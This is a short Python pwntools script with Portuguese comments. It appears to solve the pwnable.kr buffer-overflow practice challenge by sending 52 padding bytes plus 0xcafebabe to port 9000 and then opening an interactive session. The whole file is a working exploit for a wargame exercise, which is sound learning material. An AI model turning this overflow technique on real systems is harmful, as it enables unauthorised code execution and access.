import pwn

input_text = 'A'*52 # para preenchermos o espaço do buffer até chegar em ebp
input_text += '\xbe\xba\xfe\xca' # o valor que será armazenado em key

conn = pwn.remote('pwnable.kr', 9000) # conexão com o servidor que está executando o programa

conn.sendline(input_text)
conn.interactive()
